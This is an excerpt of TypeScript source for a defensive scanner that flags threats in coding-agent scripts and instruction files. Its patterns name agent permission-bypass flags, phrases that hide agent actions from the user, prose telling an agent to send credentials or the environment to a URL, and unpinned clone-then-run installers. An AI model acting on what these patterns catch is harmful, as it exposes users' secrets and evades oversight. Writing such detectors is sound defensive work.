            ruleId: 'sec_remote_code_execution', severity: quoted ? 'medium' : 'critical', line: index + 1, column: 1,
            source: 'a downloaded installer', sink: 'the user\'s machine', message, ...(quoted ? { quotedExample: true } : {}),
        });
    });
    return threats;
}

// Permission-prompt kill switches for coding agents.
const APPROVAL_BYPASS = /--dangerously-skip-permissions\b|["']?defaultMode["']?\s*[:=]\s*["']?bypassPermissions\b|\bbypassPermissions\b|["']?approval_policy["']?\s*[:=]\s*["']?never\b|--dangerously-bypass-approvals-and-sandbox\b|(?:^|\s)--yolo\b/im;

// A git ref is pinned when it names a commit or a version tag.
const PINNED_REF = /^(?:[0-9a-f]{7,40}|v?\d+(?:\.\d+){0,3}(?:[-+][\w.]+)?)$/i;

/** pip/uv install from a git URL on a branch or no ref (high), or npx/uvx/bunx/dlx @latest (medium). */
function unpinnedRemoteInstall(line: string): 'high' | 'medium' | undefined {
    if (/\b(?:pip3?|uv\s+pip|pipx)\s+install\b/i.test(line)) {
        for (const match of line.matchAll(/\bgit\+https?:\/\/[^\s"'`]+/gi)) {
            const ref = /@([^@/#\s]+)(?:#.*)?$/.exec(match[0].replace(/^git\+https?:\/\/[^/]*@/, 'git+https://'))?.[1];
            if (!ref || !PINNED_REF.test(ref)) return 'high';
        }
    }
    if (/\b(?:npx|bunx|pnpm\s+dlx|yarn\s+dlx|uvx)\b[^\n]*@latest\b/i.test(line)) return 'medium';
    return undefined;
}

// Hiding the agent's actions from the user. Prompt confidentiality ("do not
// reveal the system prompt") is legitimate and is not matched.
const USER_CONCEALMENT = [
    // "Do not tell the user." / "... about this" / "... that you ran it" hides an
    // action; "never tell them what to do with their money" withholds advice.
    /\b(?:do\s+not|don't|never)\s+(?:tell|inform|notify|alert)\s+(?:the\s+user|them|anyone)(?=\s*(?:[.,;:)!]|$)|\s+(?:about\b|of\s+(?:this|these|it)\b|that\s+you\b|what\s+you\s+(?:did|ran|sent|changed|read|uploaded)\b))/im,
    /\b(?:do\s+not|don't|never)\s+(?:mention|disclose|reveal|show|report)\s+(?:this|these|that)\s+(?:step|steps|action|actions|command|commands|upload|request|requests|change|changes)\b/i,
    /\bwithout\s+(?:telling|informing|notifying)\s+(?:the\s+user|them|anyone)\b/i,
    /\b(?:hide|conceal)\s+(?:this|these|it)\s+(?:step|steps|action|actions)?\s*from\s+the\s+user\b/i,
    /\bwithout\s+(?:the\s+user|them)\s+(?:knowing|noticing|seeing)\b/i,
];

// "The user does not need to know about the mirror" hides an action only when
// the same sentence tells the agent to do something; "the user doesn't need
// to know Python" or "…about the cache" in docs does not.
const NEED_NOT_KNOW = /\b(?:the\s+user|users?|they)\s+(?:does\s+not|doesn't|do\s+not|don't|never)\s+needs?\s+to\s+(?:know|be\s+told|be\s+informed)\b/i;
const AGENT_ACTION = /`[^`]+`|\b(?:run|push|upload|send|post|execute|install|delete|copy|commit)\b/i;

function concealedAction(content: string): { text: string; index: number } | undefined {
    let cursor = 0;
    for (const sentence of content.split(/(?<=[.!?])\s+|\n\s*\n/)) {
        const at = content.indexOf(sentence, cursor);
        if (at >= 0) cursor = at + sentence.length;
        const match = NEED_NOT_KNOW.exec(sentence);
        if (match && AGENT_ACTION.test(sentence.slice(0, match.index))) return { text: match[0], index: Math.max(0, at) + match.index };
    }
    return undefined;
}

// Prose that dumps the whole environment: `printenv`, `env`, "all environment variables".
const ENVIRONMENT_DUMP_PROSE = /\bprintenv\b|`env`|\b(?:all|every|the\s+full|the\s+entire|the\s+whole)\s+(?:of\s+the\s+)?environment(?:\s+variables)?\b/i;

function firstUnnegatedMatch(text: string, patterns: RegExp[]): { text: string; index: number } | undefined {
    let best: { text: string; index: number } | undefined;
    for (const pattern of patterns) {
        const match = pattern.exec(text);
        if (match && (!best || match.index < best.index)) best = { text: match[0], index: match.index };
    }
    return best;
}

// English, plus the common verbs in Spanish, Portuguese, French, German and Italian.
const TRANSFER_VERB = /(?:^|[^\p{L}])(?:send|upload|post|paste|share|email|forward|submit|transmit|include|attach|copy|env[ií]a|enviar|envie|envoie|envoyer|sende|senden|schicke|invia|inviare|manda|mandar)(?![\p{L}])/iu;
const DESTINATION = /https?:\/\/\S+|\b[\w.+-]+@[\w-]+\.[\w.-]+\b/i;
const PROHIBITION = /\b(?:never|do\s+not|don't|must\s+not|should\s+not|shouldn't)\b/i;

/** A sentence that names a credential store, a transfer verb and a destination. */
function proseCredentialExfiltration(content: string): (Omit<CodeThreat, 'line' | 'column'> & { offset: number }) | undefined {
    // Sentences may span lines: split on blank lines, then on sentence ends.
    let cursor = 0;
    for (const paragraph of content.split(/\n\s*\n/)) {
        for (const sentence of paragraph.split(/(?<=[.!?])\s+(?=[A-Z])/)) {
            const at = content.indexOf(sentence, cursor);
            if (at >= 0) cursor = at + sentence.length;
            const credential = sentence.split(/[\s`'"(),;:]+/).find(token => CREDENTIAL_PATH.test(token.replace(/[.]$/, '')))
                || (ENVIRONMENT_DUMP_PROSE.test(sentence) ? 'the whole environment' : undefined);
            const destination = DESTINATION.exec(sentence)?.[0];
            if (credential && destination && TRANSFER_VERB.test(sentence) && !PROHIBITION.test(sentence)) {
                return {
                    ruleId: 'sec_credential_exfiltration', severity: 'critical',
                    source: credential, sink: destination,
                    message: `Instructs the agent to send ${credential} to ${destination}.`,
                    offset: Math.max(0, at),
                };
            }
        }
    }
    return undefined;
}

function analyzeShellThreats(content: string): CodeThreat[] {
    const threats: CodeThreat[] = [];
    const lines = content.split(/\r?\n/);
    let credential: { text: string; line: number } | undefined;
    let network: { text: string; line: number } | undefined;
    lines.forEach((raw, index) => {
        const line = raw.replace(/(^|\s)#.*$/, '$1');
        if (!line.trim()) return;
        threats.push(...commandLineThreats(line, index + 1));
        const credentialMatch = line.split(/\s+/).find(token => CREDENTIAL_PATH.test(token.replace(/^["'$({]+|["')}]+$/g, '')));
        if (credentialMatch && !credential) credential = { text: credentialMatch, line: index + 1 };
        const networkMatch = SHELL_NETWORK.exec(line);
        if (networkMatch && !network) network = { text: networkMatch[0], line: index + 1 };
    });
    const alreadyReported = threats.some(threat => threat.ruleId === 'sec_credential_exfiltration');
    if (credential && network && !alreadyReported) {
        threats.push({
            ruleId: 'sec_credential_exfiltration', severity: 'critical', line: network.line, column: 1,
            source: credential.text, sink: network.text,
            message: `Reads ${credential.text} and sends data over the network (${network.text}) in the same script.`,
        });
    }
    const cloneThenRun = unpinnedCloneThenRun(lines);
    if (cloneThenRun) threats.push(cloneThenRun);
    return threats;
}

const GIT_CLONE = /\bgit\s+clone\b[^\n]*?((?:https?:\/\/|git@)[^\s"'`]+)/;
// --branch v1.2.3 / -b 2.0, or a later checkout/reset to a commit or version tag.
const PINNED_CLONE = /\s(?:--branch|-b)\s+["']?v?\d+(?:\.\d+)+/;
const PINNED_CHECKOUT = /\bgit\s+(?:-C\s+\S+\s+)?(?:checkout|reset\s+--hard)\s+["']?(?:[0-9a-f]{7,40}|v?\d+(?:\.\d+)+)\b/;
// Running something from the checkout: ./install.sh, bash setup.sh, make install, pip install .
const RUNS_SCRIPT = /(?:^|[;&|(]\s*|\bthen\s+)(?:sudo\s+)?(?:\.\/[\w.-]+|(?:ba|z)?sh\s+["']?[\w./$-]+\.sh\b|make\s+install\b|pip3?\s+install\s+(?:-e\s+)?\.(?:\s|$))/;

/**
 * A script that clones a third-party repository at whatever its default branch
 * holds and then runs code from it (its installer): whoever controls that
 * repository decides what runs. Pinning a tag or commit removes the finding.
 */
function unpinnedCloneThenRun(lines: string[]): CodeThreat | undefined {
    const code = lines.map(raw => raw.replace(/(^|\s)#.*$/, '$1'));
    const cloneIndex = code.findIndex(line => GIT_CLONE.test(line));
    if (cloneIndex < 0) return undefined;
    if (PINNED_CLONE.test(code[cloneIndex]) || code.some(line => PINNED_CHECKOUT.test(line))) return undefined;
    const runsIndex = code.findIndex((line, index) => index >= cloneIndex && RUNS_SCRIPT.test(line.trim()));
    if (runsIndex < 0) return undefined;
    const url = GIT_CLONE.exec(code[cloneIndex])?.[1] || 'a git repository';
    return {
        ruleId: 'sec_unpinned_remote_install', severity: 'high', line: runsIndex + 1, column: 1,
        source: url, sink: code[runsIndex].trim().slice(0, 80),
        message: `Clones ${url} at its latest commit and runs code from it; whoever controls that repository controls what this script installs.`,
    };
}

/**
 * Behaviour-level threats in a script. Returns [] for files it does not
 * analyse, files that do not parse, or when grammars are not loaded (call
 * loadCodeCapabilityGrammars() first for Python and JS/TS).
 */
export function scanCodeForThreats(filePath: string, content: string): CodeThreat[] {
    if (SHELL_EXTENSIONS.has(extensionOf(filePath))) return analyzeShellThreats(content);
    if (INSTRUCTION_EXTENSIONS.has(extensionOf(filePath))) return analyzeInstructionThreats(content);
    const grammar = grammarForPath(filePath);
    if (grammar !== 'python' && grammar !== 'typescript') return [];
    const tree = parseWithLoadedGrammar(grammar, content);
    if (!tree) return [];
    try {
        if (hasSyntaxError(tree.rootNode)) return [];
        return grammar === 'python' ? analyzePythonThreats(tree.rootNode) : analyzeScriptThreats(tree.rootNode);
    } finally {
        tree.delete();
    }
}
